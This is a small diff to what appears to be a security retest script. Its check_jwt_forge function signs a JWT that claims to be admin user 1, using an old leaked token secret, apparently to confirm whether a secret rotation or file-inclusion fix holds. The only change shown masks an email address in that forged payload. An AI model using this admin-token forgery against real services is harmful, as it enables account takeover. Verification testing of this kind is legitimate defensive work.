@@ -488,7 +488,7 @@ def check_jwt_forge(envtxt):
             {"reason": "secret rotated or LFI closed / pyjwt missing" if not envtxt else "JWT secret rotated"})
         return
     now = int(time.time())
-    tok = pyjwt.encode({"id": 1, "email": "1226028048@qq.com", "user_source": "admin_web",
+    tok = pyjwt.encode({"id": 1, "email": "122602****@qq.com", "user_source": "admin_web",
                         "login_method": "mail_code", "iat": now, "exp": now + 600},
                        OLD_SECRETS["access_token_secret"], algorithm="HS256")
     try:
